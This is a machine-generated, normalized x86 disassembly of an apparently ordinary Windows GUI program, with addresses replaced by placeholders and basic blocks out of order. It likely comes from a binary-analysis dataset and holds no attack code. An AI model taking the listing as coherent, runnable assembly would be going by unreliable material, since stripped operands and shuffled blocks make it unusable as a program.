jmp r-xdata
xor eax eax
cmp edx ebp
setne al
test eax eax
je r-xdata
cmp [ eax + 0x18 ] 0x10
jb r-xdata
mov ecx ebp
mov ecx rw-data
call sub_404310
dec esi
jne r-xdata
push 0x1
call edi
mov ecx rw-data
call sub_404310
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx ebx
sub ecx esi
mov eax 0x66666667
imul ecx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov ecx rw-data
call sub_401420
dec esi
jne r-xdata
call [ SetWindowTextA@IAT ]
mov esi [ rw-data ]
mov al [ esp + 0x26 ]
test al al
jne r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov esi [ esp + 0x508 ]
mov ebx [ esp + 0x50c ]
inc esi
mov ebp esi
mov [ esp + 0x14 ] 0xffffffff
imul ebp ebp 0x70
mov esi [ GetCurrentProcess@IAT ]
push 0x2
push 0x0
push 0x0
lea eax [ esp + 0x50 ]
push eax
call esi
push eax
call [ GetCurrentThread@IAT ]
push eax
call esi
push eax
call [ DuplicateHandle@IAT ]
mov eax [ esp + 0x44 ]
mov ecx [ esp + 0x508 ]
push eax
mov [ esp + 0x4c ] eax
mov [ esp + 0x50 ] ebx
mov [ esp + 0x58 ] ecx
call [ GetThreadPriority@IAT ]
lea edx [ esp + 0x48 ]
push edx
mov ecx rw-data
mov [ esp + 0x54 ] eax
mov [ esp + 0x5c ] 0x0
call sub_46bce0
mov al [ esp + 0x510 ]
test al al
je r-xdata
cmp [ esi + edi + 0x4 ] ebx
je r-xdata
cmp ebp edx
jge r-xdata
mov eax [ esp + 0xc8 ]
mov ebx 0x10
cmp eax ebx
jb r-xdata
lea esi [ eax + 0x4 ]
mov esi [ eax + 0x4 ]
jmp r-xdata
mov ecx rw-data
call sub_401420
mov al [ esp + 0x27 ]
test al al
jne r-xdata
mov ecx [ ebp ]
cmp ecx [ esp + 0x508 ]
jne r-xdata
cmp edi edx
jge r-xdata
mov esi [ esp + 0x1c ]
xor ebx ebx
cmp esi ebx
mov [ esp + 0x500 ] 0x1
je r-xdata
mov esi [ rw-data ]
xor edi edi
xor ebp ebp
mov [ esp + 0x10 ] edi
mov [ esp + 0x18 ] ebp
mov eax [ rw-data ]
test eax eax
je r-xdata
mov dl [ esp + 0x514 ]
test dl dl
sete dl
lea ecx [ esp + 0x10 ]
push edx
push ecx
lea edx [ esp + 0x20 ]
push edx
push eax
call sub_4af910
mov eax [ esp + 0x20 ]
add esp 0x10
test eax eax
je r-xdata
mov ecx [ rw-data ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov al [ esp + 0x514 ]
test al al
jne r-xdata
inc ebp
add edi 0x14
jmp r-xdata
mov al [ esp + 0x514 ]
test al al
jne r-xdata
mov eax [ esp + 0x74 ]
xor edi edi
cmp eax ebx
mov esi 0xf
mov [ esp + 0xc8 ] esi
mov [ esp + 0xc4 ] edi
mov [ esp + 0xb4 ] 0x0
jb r-xdata
mov eax [ esp + 0xb4 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
test eax eax
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
xor eax eax
[ esi ] [ edi ]
je r-xdata
push 0x1
call [ Sleep@IAT ]
mov ecx rw-data
mov [ esp + 0x27 ] 0x0
call sub_404310
mov esi [ rw-data ]
mov ebx [ rw-data ]
xor edi edi
lea ebp [ esi + 0xc ]
lea ecx [ ecx ]
mov esi [ esp + 0x3c ]
test esi esi
mov [ esp + 0x500 ] 0x1
jle r-xdata
inc edi
add ebp 0x14
jmp r-xdata
mov [ esp + 0x27 ] 0x1
mov eax [ esp + 0xc8 ]
mov edi 0x10
cmp eax edi
jb r-xdata
dec [ esi + 0xd48 ]
jne r-xdata
mov ecx [ rw-data ]
sub ecx esi
mov eax 0x66666667
imul ecx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov ebp [ esp + 0x508 ]
mov ecx [ rw-data ]
sub ecx eax
sar ecx 0x2
test ecx ecx
jbe r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
xor esi esi
push esi
push esi
push 0x3
push esi
push 0x1
push 0x80000000
push eax
call [ CreateFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
mov ebp [ esp + 0x38 ]
mov ebx [ esp + 0x38 ]
jmp r-xdata
cmp [ edi + ebp + 0x38 ] 0xffffffff
je r-xdata
cmp esi edx
jge r-xdata
mov eax [ rw-data ]
cmp eax [ rw-data ]
push 0x208
jne r-xdata
test esi esi
jne r-xdata
mov al [ esi + edi + 0x10 ]
test al al
jne r-xdata
mov ecx rw-data
mov [ esp + 0x74 ] esi
mov [ esp + 0x70 ] edi
mov [ esp + 0x60 ] 0x0
call sub_401420
mov eax [ esp + 0x10 ]
jmp r-xdata
mov ecx [ esp + 0x60 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov edx [ esp + 0x50 ]
mov eax [ esp + 0x48 ]
mov ebx [ SetThreadPriority@IAT ]
push edx
push eax
call ebx
mov esi [ rw-data ]
mov edi [ esp + 0x1c ]
mov ebp [ GetWindowTextA@IAT ]
lea ebx [ ebx ]
test esi esi
jne r-xdata
cmp [ esp + 0x74 ] edi
mov esi 0xf
mov [ esp + 0xc8 ] esi
mov [ esp + 0xc4 ] ebx
mov [ esp + 0xb4 ] 0x0
jb r-xdata
mov edx [ esp + 0xb4 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ esi + ebp + 0x4 ]
cmp ecx [ esp + 0x34 ]
jne r-xdata
cmp edi edx
jge r-xdata
cmp eax 0x2
jne r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
mov ebp [ esp + 0x508 ]
mov ecx [ eax + ebp * 4 ]
test ecx ecx
je r-xdata
mov esi 0x9
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x14 ]
push 0x0
push 0x0
push 0x0
push ecx
mov ecx [ esp + 0x2c ]
push 0x0
push edx
push eax
mov eax [ esp + 0x524 ]
push eax
call sub_4402e0
mov esi eax
jmp r-xdata
mov ecx [ rw-data ]
lea eax [ ebx + ecx ]
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0x1c ]
push ecx
push eax
call sub_4adff0
add esp 0xc
jmp r-xdata
push esi
push edi
call [ GetFileSize@IAT ]
mov ebp eax
push ebp
push esi
call [ LocalAlloc@IAT ]
test eax eax
mov [ esp + 0x18 ] eax
je r-xdata
cmp [ esp + 0x14 ] 0xffffffff
jne r-xdata
inc esi
add ebp 0x70
jmp r-xdata
push 0x0
push 0x0
push ebx
push esi
call sub_4706c0
add esp 0x10
test eax eax
mov [ esp + 0x14 ] eax
jge r-xdata
lea edx [ esp + 0xd4 ]
push edx
push eax
call [ GetWindowTextA@IAT ]
push r--data
lea eax [ esp + 0xd4 ]
push eax
call [ lstrcatA@IAT ]
mov edx [ rw-data ]
lea ecx [ esp + 0xd0 ]
push ecx
push edx
mov ecx [ rw-data ]
lea eax [ esp + 0xd4 ]
push eax
push ecx
call [ GetWindowTextA@IAT ]
push r--data
lea edx [ esp + 0xd4 ]
push edx
call [ lstrcatA@IAT ]
mov ecx [ rw-data ]
lea eax [ esp + 0xd0 ]
push eax
push ecx
jmp r-xdata
mov ecx [ esi + edi ]
push ecx
call [ SuspendThread@IAT ]
mov edx [ rw-data ]
mov [ edx + edi + 0x10 ] 0x1
mov esi [ rw-data ]
mov ecx rw-data
call sub_404310
dec esi
jne r-xdata
mov ecx rw-data
mov [ esp + 0x74 ] esi
mov [ esp + 0x70 ] ebx
mov [ esp + 0x60 ] 0x0
call sub_401420
mov eax [ esp + 0x14 ]
mov eax [ esp + 0x60 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov al [ esp + 0x514 ]
test al al
jne r-xdata
mov edx [ esi + ebp ]
push edx
call [ CloseHandle@IAT ]
mov ebx edi
jmp r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
cmp [ rw-data ] 0x10
mov eax [ rw-data ]
jae r-xdata
mov edx [ rw-data ]
mov eax [ rw-data ]
fld [ edx * 4 + rw-data ]
cmp eax 0x10
fstp [ esp + 0x2c ]
mov eax [ rw-data ]
jae r-xdata
mov eax [ esp + 0x9c ]
cmp eax 0x1
jne r-xdata
mov edx [ esp + 0x20 ]
push 0x0
push 0x0
push 0x0
push edx
mov eax ecx
mov ecx [ esp + 0x24 ]
push 0x0
push ecx
mov ecx [ esp + 0x34 ]
push eax
push ebp
mov [ esp + 0x60 ] eax
call sub_4402e0
jmp r-xdata
test esi esi
jne r-xdata
push edi
call [ CloseHandle@IAT ]
jmp r-xdata
push esi
lea ecx [ esp + 0x30 ]
push ecx
push ebp
push eax
push edi
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov ecx [ esp + 0x508 ]
push ebx
push ebp
push ecx
mov ecx [ esp + 0x28 ]
call sub_43e770
jmp r-xdata
jmp r-xdata
test edi edi
jne r-xdata
mov edi [ esp + 0x14 ]
mov ecx [ rw-data ]
shl edi 0x2
mov esi [ ecx + edi ]
call sub_40af00
push eax
push 0x0
mov ecx esi
call sub_4440b0
mov edx [ rw-data ]
mov esi [ edx + edi ]
mov ebp eax
call sub_40af00
push eax
push 0x0
mov ecx esi
call sub_444100
mov ebx eax
cmp ebp ebx
jg r-xdata
mov edi [ rw-data ]
call [ SetWindowTextA@IAT ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x18 ]
inc ecx
add eax 0x14
mov [ esp + 0x10 ] ecx
mov [ esp + 0x18 ] eax
mov ebp eax
mov edi ecx
jmp r-xdata
mov edx [ esp + 0x18 ]
cmp [ esi + edx + 0x10 ] 0x1
jne r-xdata
mov esi [ rw-data ]
test esi esi
mov edi [ rw-data ]
jne r-xdata
push 0x0
push 0x0
push 0x0
lea edx [ esp + 0x4c ]
push edx
lea eax [ esp + 0x6c ]
push eax
call sub_4053a0
mov edi [ rw-data ]
xor ecx ecx
add esp 0x14
test eax eax
setge cl
test edi edi
mov esi ecx
jne r-xdata
test eax eax
jne r-xdata
push 0x1
lea ecx [ esp + 0x14 ]
push ecx
lea edx [ esp + 0x34 ]
push edx
lea ecx [ esp + 0x34 ]
push ecx
lea edx [ esp + 0x24 ]
push edx
lea ecx [ esp + 0xe4 ]
push ecx
mov ecx [ esp + 0xb8 ]
lea edx [ esp + 0x38 ]
push edx
push ecx
push 0x0
push 0x0
push eax
call sub_406950
mov ebp eax
add esp 0x2c
test ebp ebp
jl r-xdata
mov eax rw-data
lea ecx [ esp + 0x2c ]
push ecx
lea edx [ esp + 0x2c ]
push edx
lea ecx [ esp + 0x1c ]
push ecx
lea edx [ esp + 0xdc ]
push edx
mov edx [ esp + 0x3c ]
lea ecx [ esp + 0x30 ]
push ecx
mov ecx [ esp + 0xb4 ]
push edx
push ecx
push eax
call sub_405d40
add esp 0x20
cmp eax 0x1
jne r-xdata
mov eax rw-data
mov esi eax
cmp esi 0x9
jne r-xdata
mov edi [ rw-data ]
mov eax [ esp + 0x18 ]
push eax
call [ LocalFree@IAT ]
mov edx [ esp + 0x20 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push esi
push esi
push esi
push edx
mov edx [ esp + 0x518 ]
push esi
push eax
push ecx
mov ecx [ esp + 0x38 ]
push edx
call sub_4402e0
mov esi eax
mov ebx [ esp + 0x18 ]
mov esi [ esp + 0x508 ]
dec esi
test esi esi
jl r-xdata
mov edi [ rw-data ]
mov edi [ rw-data ]
test esi esi
jne r-xdata
mov edi edx
mov eax [ esi + edi ]
push eax
call [ ResumeThread@IAT ]
mov ecx [ rw-data ]
mov [ ecx + edi + 0x10 ] 0x0
mov ecx edi
sub ecx esi
mov eax 0x66666667
imul ecx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov ecx [ rw-data ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov ecx [ esp + 0x74 ]
cmp ecx 0x10
mov esi [ esp + 0x60 ]
mov eax esi
jae r-xdata
mov edx [ esp + 0x2c ]
mov eax [ esp + 0x28 ]
mov ecx [ esp + 0x14 ]
push 0x0
push edx
mov edx [ esp + 0x28 ]
push eax
mov eax [ esp + 0x1c ]
push ecx
sub esp 0x428
mov edi esp
push edx
mov ecx 0x10a
lea esi [ esp + 0x50c ]
[ edi ] [ esi ]
mov ecx [ esp + 0x944 ]
push eax
push ecx
mov ecx [ esp + 0x460 ]
call sub_43e840
mov esi eax
cmp esi 0x1
jne r-xdata
mov edx [ esp + 0x2c ]
mov eax [ esp + 0x28 ]
mov ecx [ esp + 0x14 ]
push 0x0
push edx
mov edx [ esp + 0x28 ]
push eax
movzx eax [ esp + 0xea ]
push ecx
sub esp 0x428
mov edi esp
push edx
or eax 0x10000000
mov ecx 0x10a
lea esi [ esp + 0x50c ]
push eax
[ edi ] [ esi ]
mov ecx [ esp + 0x45c ]
push ebp
call sub_43e840
jmp r-xdata
mov edx [ rw-data ]
mov [ ebx + edx + 0x30 ] esi
mov eax [ rw-data ]
lea esi [ ebx + eax ]
call [ timeGetTime@IAT ]
sub eax [ esp + 0x30 ]
mov [ esi + 0x34 ] eax
mov ecx [ rw-data ]
lea esi [ ebx + ecx ]
call sub_40af00
mov edi [ esp + 0x1c ]
push eax
push 0x0
mov ecx edi
call sub_4440b0
mov [ esi + 0x4c ] eax
mov edx [ rw-data ]
lea esi [ ebx + edx ]
call sub_40af00
push eax
push 0x0
mov ecx edi
call sub_444100
mov [ esi + 0x50 ] eax
cmp [ rw-data ] 0x5
jne r-xdata
mov ecx [ rw-data ]
mov [ ebx + ecx + 0x30 ] esi
mov [ esp + 0x14 ] 0xfffffffc
jmp r-xdata
mov eax esi
imul eax eax 0x70
mov [ esp + 0x14 ] eax
nop
test esi esi
jne r-xdata
lea edi [ esi + ebp ]
lea esi [ edi + 0x14 ]
mov ecx 0x5
inc ebx
[ edi ] [ esi ]
add ebp 0x14
jmp r-xdata
dec edx
cmp ebx edx
jge r-xdata
test esi esi
je r-xdata
cmp [ esp + 0x74 ] 0x10
mov eax [ esp + 0x60 ]
lea ecx [ ebx + edi ]
jae r-xdata
cmp edx ebp
jle r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push eax
call sub_439280
mov ecx [ esp + 0x30 ]
add esp 0x4
push eax
push esi
push ebp
call sub_4411b0
jmp r-xdata
lea eax [ esp + 0x60 ]
lea esi [ esp + 0x60 ]
test ebp ebp
je r-xdata
mov esi [ rw-data ]
mov edi [ rw-data ]
mov eax [ edi + esi * 4 ]
xor ebx ebx
xor ebp ebp
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ esp + 0x14 ]
dec esi
sub ecx 0x70
test esi esi
mov [ esp + 0x14 ] ecx
jge r-xdata
mov ecx [ esp + 0x50c ]
push 0x0
push 0x0
push ecx
push esi
call sub_4706c0
add esp 0x10
test eax eax
jge r-xdata
sub edi esi
mov eax 0x66666667
imul edi
sar edx 0x3
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
mov eax [ esp + 0x7c ]
mov ecx [ rw-data ]
cmp eax ecx
ja r-xdata
mov edx [ esp + 0x70 ]
push edx
push eax
mov eax [ ecx + 0x14 ]
push eax
push 0x0
call sub_401150
test eax eax
jne r-xdata
lea eax [ esp + 0x60 ]
mov esi 0x2
mov ecx [ rw-data ]
mov edx [ esp + 0x508 ]
mov [ ecx + esi * 4 ] edx
mov ecx [ rw-data ]
test ecx ecx
lea edx [ esi + 0x1 ]
mov [ rw-data ] edx
jne r-xdata
mov eax [ edi + esi * 4 ]
mov eax [ eax + 0xd48 ]
cmp eax 0x1
jle r-xdata
call sub_40af00
push eax
push 0x0
mov ecx edi
call sub_4440b0
mov esi eax
mov [ esp + 0x20 ] esi
call sub_40af00
push eax
push 0x0
mov ecx edi
call sub_444100
mov ecx [ rw-data ]
test ecx ecx
mov [ esp + 0x14 ] eax
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ edi + eax + 0x38 ] 0xffffffff
je r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov edi [ edx + eax * 4 ]
lea esi [ eax * 4 ]
call sub_40af00
push eax
push 0x0
mov ecx edi
call sub_4440b0
mov ebp eax
mov eax [ rw-data ]
mov esi [ eax + esi ]
call sub_40af00
push eax
push 0x0
mov ecx esi
call sub_444100
mov ebx eax
mov edi [ rw-data ]
mov esi [ rw-data ]
sub esp 0x14
mov edi esp
mov ecx 0x5
lea esi [ esp + 0x5c ]
dec edx
[ edi ] [ esi ]
push edx
mov ecx rw-data
call sub_46b090
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x18 ]
dec ecx
sub eax 0x14
mov [ esp + 0x10 ] ecx
mov [ esp + 0x18 ] eax
jmp r-xdata
mov [ esp + 0x10 ] 0x1
mov edi [ rw-data ]
add edi eax
cmp edi ecx
mov [ esp + 0x10 ] 0x0
mov [ rw-data ] edi
jbe r-xdata
mov edi [ rw-data ]
mov ecx [ rw-data ]
lea edx [ esp + 0x5c ]
add ecx ebx
push edx
call sub_402540
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
test ebp ebp
je r-xdata
mov [ esp + 0x28 ] esi
mov [ esp + 0x2c ] eax
test edi edi
push 0x3f800000
push ecx
mov eax esp
mov [ esp + 0x38 ] esp
push ecx
mov [ eax ] 0x0
mov [ esp + 0x3c ] esp
mov eax esp
je r-xdata
mov ecx [ esp + 0x40 ]
mov edx [ rw-data ]
mov eax [ esp + 0x508 ]
mov [ edx + eax * 4 ] ecx
lea ecx [ esp + 0x508 ]
push ecx
mov ecx rw-data
call sub_46a5f0
jmp r-xdata
mov ebx [ rw-data ]
mov esi [ rw-data ]
mov ebx [ esp + 0x1c ]
test ebx ebx
lea edi [ ecx + esi * 4 ]
je r-xdata
mov [ rw-data ] 0x0
cmp edx eax
jne r-xdata
mov ebp eax
mov [ esp + 0x30 ] esi
cmp ebp eax
jle r-xdata
mov eax [ rw-data ]
test eax eax
jle r-xdata
fild [ rw-data ]
push ecx
fimul [ esp + 0x24 ]
fmul [ r--data ]
fstp [ esp ]
call sub_452500
fild [ rw-data ]
mov edi eax
fimul [ esp + 0x18 ]
fmul [ r--data ]
fstp [ esp ]
call sub_452500
add esp 0x4
mov esi eax
jmp r-xdata
mov [ eax ] edi
push 0x1
lea eax [ esp + 0x3c ]
push eax
lea ecx [ esp + 0x3c ]
push ecx
lea edx [ esp + 0x28 ]
push edx
lea eax [ esp + 0x34 ]
push eax
call sub_45ddb0
add esp 0x20
jmp r-xdata
inc [ edi + 0xd48 ]
mov edx [ esp + 0x20 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
push 0x0
push 0x0
push 0x0
push edx
mov edx [ esp + 0x50 ]
push eax
mov eax [ esp + 0x51c ]
push ecx
mov ecx [ esp + 0x34 ]
push edx
push eax
call sub_4402e0
mov ebp [ rw-data ]
mov ecx [ ebp + ecx * 4 ]
mov ecx [ ecx + edx * 4 ]
mov edx [ rw-data ]
imul ecx ecx 0x70
add ecx edx
sub edi [ ecx + 0x20 ]
lea edx [ eax * 4 ]
sub esi edx
cmp ebx eax
mov [ rw-data ] edi
ja r-xdata
sub ecx ebx
mov ebp [ edi ]
test ebp ebp
je r-xdata
inc [ ebx + 0xd48 ]
mov ecx [ rw-data ]
sub ecx edi
sar ecx 0x2
xor ecx ecx
jmp r-xdata
test edi edi
jne r-xdata
mov eax [ rw-data ]
test eax eax
jle r-xdata
fild [ esp + 0x20 ]
push ecx
fstp [ esp + 0x24 ]
fild [ rw-data ]
fmul [ esp + 0x24 ]
fidiv [ esp + 0x2c ]
fstp [ esp ]
call sub_452500
mov edi eax
mov [ esp + 0x1c ] edi
fild [ esp + 0x1c ]
fdiv [ esp + 0x24 ]
fimul [ esp + 0x18 ]
fstp [ esp ]
call sub_452500
add esp 0x4
mov esi eax
jmp r-xdata
mov ebp [ rw-data ]
push 0x0
push 0x0
push 0x0
call sub_40af00
mov ecx [ esp + 0x28 ]
push eax
push 0x0
push ebp
push esi
push edi
call sub_441880
mov eax [ rw-data ]
test eax eax
jle r-xdata
mov eax [ ebp + eax * 4 ]
mov eax [ eax + esi * 4 ]
mov ecx [ rw-data ]
mov edx [ ecx + eax * 4 ]
push edx
call [ LocalFree@IAT ]
mov ecx [ rw-data ]
mov eax ecx
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea edx [ eax * 4 ]
sub ecx edx
mov edx [ rw-data ]
cmp edx eax
ja r-xdata
sub eax ebx
mov [ edi ] ebx
mov [ esp + 0x14 ] esi
dec [ ebp + 0xd48 ]
jne r-xdata
mov eax [ rw-data ]
sub eax edi
sar eax 0x2
xor eax eax
jmp r-xdata
lea eax [ esi + 0x1 ]
cdq
idiv ecx
inc ebx
test edi edi
mov esi edx
jne r-xdata
mov esi [ esp + 0x10 ]
mov edi [ esp + 0x18 ]
fild [ esp + 0x14 ]
push ecx
fstp [ esp + 0x2c ]
fild [ rw-data ]
fmul [ esp + 0x2c ]
fidiv [ esp + 0x30 ]
fstp [ esp ]
call sub_452500
mov esi eax
mov [ esp + 0x14 ] esi
fild [ esp + 0x14 ]
fdiv [ esp + 0x2c ]
fimul [ esp + 0x24 ]
fstp [ esp ]
call sub_452500
add esp 0x4
mov edi eax
jmp r-xdata
mov edx [ rw-data ]
mov eax [ edx + eax * 4 ]
mov ecx [ eax + ecx * 4 ]
mov edx [ rw-data ]
mov [ edx + ecx * 4 ] 0x0
mov eax [ rw-data ]
test eax eax
mov ebx [ rw-data ]
mov esi [ rw-data ]
je r-xdata
sub eax edx
mov ecx ebp
call sub_43fe30
push ebp
call j_sub_4b66ed#2
add esp 0x4
mov esi [ esp + 0x30 ]
cmp [ edi + esi * 4 ] 0x0
jne r-xdata
cmp ebx eax
je r-xdata
mov edi [ rw-data ]
cmp edi [ rw-data ]
ja r-xdata
inc esi
lea eax [ ebx * 4 ]
cmp eax esi
mov [ rw-data ] esi
ja r-xdata
jmp r-xdata
mov eax esi
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov ecx eax
lea edx [ ecx * 4 ]
mov ebp edx
mov edx esi
sub edx ebp
cmp ebx ecx
ja r-xdata
dec [ rw-data ]
jne r-xdata
xor esi esi
mov [ rw-data ] esi
xor esi esi
mov [ rw-data ] esi
sub_4719b0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c0df8
push eax
mov eax [ rw-data ]
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
xor ebx ebx
cmp eax ebx
jle r-xdata
mov ecx [ esp + 0x14 ]
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x1c
retn
push ebp
push esi
push edi
mov edi [ esp + 0x30 ]
cmp edi ebx
je r-xdata
pop edi
pop esi
pop ebp
mov ecx [ rw-data ]
cmp ecx ebx
mov [ rw-data ] edi
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
mov eax [ rw-data ]
and eax 0x3fffffff
cmp eax 0x15e
je r-xdata
mov ebp [ rw-data ]
mov esi [ rw-data ]
cmp esi ebx
je r-xdata
mov eax [ rw-data ]
push ecx
push eax
mov [ rw-data ] ebx
call [ KillTimer@IAT ]
mov [ rw-data ] ebx
cmp eax 0x15f
jne r-xdata
cmp ecx ebx
je r-xdata
cmp ecx ebx
je r-xdata
mov al [ esp + 0x3c ]
test al al
je r-xdata
mov eax [ rw-data ]
add edi ebp
cmp ebp ebx
mov [ esp + 0x18 ] ebp
jne r-xdata
cmp esi 0x1
jne r-xdata
cmp esi 0x2
jne r-xdata
call sub_40af00
xor ecx ecx
mov cl [ rw-data ]
push eax
push ecx
mov ecx esi
call sub_4440b0
mov esi [ rw-data ]
call sub_40af00
xor edx edx
mov dl [ rw-data ]
push eax
mov ecx esi
push edx
call sub_444100
mov eax [ rw-data ]
push eax
call sub_4a8dd0
add esp 0x4
test al al
je r-xdata
mov ecx [ rw-data ]
dec ecx
cmp ebp ecx
jne r-xdata
mov bl [ esp + 0x3c ]
test bl bl
je r-xdata
mov esi 0x2
mov [ rw-data ] esi
cmp esi 0x1
jne r-xdata
cmp edi 0xfffffffe
jne r-xdata
mov [ rw-data ] ebx
cmp edi ebx
jle r-xdata
mov ebx [ esp + 0x1c ]
mov cl [ esp + 0x3c ]
test cl cl
je r-xdata
cmp [ esp + 0x14 ] 0xffffffff
jne r-xdata
cmp edi 0xfffffffe
mov esi 0x2
mov [ rw-data ] esi
jne r-xdata
cmp [ esp + 0x34 ] ebx
jge r-xdata
jge r-xdata
cmp [ rw-data ] ebx
jne r-xdata
mov eax [ esp + 0x30 ]
test eax eax
jle r-xdata
mov eax [ rw-data ]
xor edi edi
cmp eax edi
je r-xdata
cmp [ esp + 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp edi 0x2
jne r-xdata
or edi 0xffffffff
mov [ esp + 0x30 ] edi
jmp r-xdata
or edi 0xffffffff
mov [ esp + 0x30 ] edi
jmp r-xdata
mov ecx [ rw-data ]
mov eax 0x1
cmp ecx eax
jne r-xdata
mov edx [ rw-data ]
mov ebp [ rw-data ]
dec edx
cmp ebp edx
jge r-xdata
mov ecx [ esp + 0x38 ]
push 0x1
push ebx
push 0xffffffff
mov [ rw-data ] 0x1
push ecx
jmp r-xdata
cmp [ esp + 0x18 ] edi
mov [ rw-data ] 0x0
jne r-xdata
movzx edx dl
sub edi edx
test dl dl
jne r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
mov ebx [ esp + 0x1c ]
cmp ebx 0x2
jne r-xdata
mov edi 0x1
mov [ esp + 0x30 ] edi
jmp r-xdata
mov ebp [ rw-data ]
cmp ebp ebx
jle r-xdata
push eax
mov eax [ esp + 0x3c ]
push ebx
push 0xffffffff
mov [ rw-data ] ebx
push eax
jmp r-xdata
mov al [ esp + 0x3c ]
test al al
mov dl [ rw-data ]
mov esi [ rw-data ]
mov ecx [ rw-data ]
mov [ esp + 0x14 ] edi
mov [ esp + 0x13 ] dl
mov [ esp + 0x1c ] esi
je r-xdata
mov [ rw-data ] ebx
jmp r-xdata
call sub_485220
add esp 0x10
mov eax [ rw-data ]
cmp edi eax
jl r-xdata
mov al [ esp + 0x13 ]
test al al
jne r-xdata
cmp ebp edi
jne r-xdata
cmp ebx 0x1
jne r-xdata
mov [ rw-data ] edi
mov [ rw-data ] 0x0
mov eax [ rw-data ]
test eax eax
je r-xdata
test ecx ecx
je r-xdata
test dl dl
jne r-xdata
mov [ rw-data ] eax
jmp r-xdata
mov ebx [ esp + 0x38 ]
push 0x0
mov ebp 0x1
push ebp
push ebx
push edi
mov [ rw-data ] edi
call sub_4706c0
add esp 0x10
test eax eax
jge r-xdata
lea edi [ eax - 0x1 ]
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] 0x0
jmp r-xdata
cmp esi 0x2
jne r-xdata
cmp [ rw-data ] edi
mov [ rw-data ] ebx
je r-xdata
mov eax [ rw-data ]
mov ebx [ esp + 0x38 ]
xor edi edi
push edi
push 0x1
dec eax
push ebx
push eax
mov [ rw-data ] 0x0
mov [ rw-data ] eax
call sub_4706c0
add esp 0x10
cmp eax edi
jge r-xdata
mov eax [ esp + 0x14 ]
lea ecx [ eax + ebp ]
test ecx ecx
jge r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
lea eax [ ecx + eax * 4 ]
push eax
mov ecx rw-data
call sub_40b320
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
dec eax
cmp ebp eax
je r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
push 0x0
call [ MessageBeep@IAT ]
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
add esp 0x1c
retn
cmp [ esp + 0x18 ] edi
mov [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] edi
je r-xdata
mov eax [ rw-data ]
mov edx [ rw-data ]
push sub_45ba40
push 0x320
push 0x3
push eax
mov [ rw-data ] edx
mov [ rw-data ] 0x15e
call [ SetTimer@IAT ]
mov ecx [ rw-data ]
push 0x0
push 0x0
push ecx
mov ecx [ rw-data ]
lea edx [ ecx + eax * 4 ]
push edx
mov ecx rw-data
call sub_40b320
push edi
push 0x1
push ebx
push edi
mov [ rw-data ] edi
call sub_4706c0
add esp 0x10
cmp eax edi
jge r-xdata
mov eax [ rw-data ]
cmp eax edi
je r-xdata
push 0x0
call sub_4a9250
add esp 0x4
test al al
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov esi [ rw-data ]
call sub_40af00
xor edx edx
mov dl [ rw-data ]
push eax
mov ecx esi
push edx
call sub_4440b0
mov esi [ rw-data ]
call sub_40af00
push eax
xor eax eax
mov al [ rw-data ]
mov ecx esi
push eax
call sub_444100
mov ecx [ rw-data ]
push ecx
call sub_4a8dd0
add esp 0x4
test al al
jne r-xdata
mov [ rw-data ] 0x0
jmp r-xdata
mov edx [ eax + 0xd48 ]
mov esi eax
add eax 0xd48
dec edx
mov ecx edx
test ecx ecx
mov [ eax ] edx
jne r-xdata
mov al [ esp + 0x13 ]
mov [ rw-data ] al
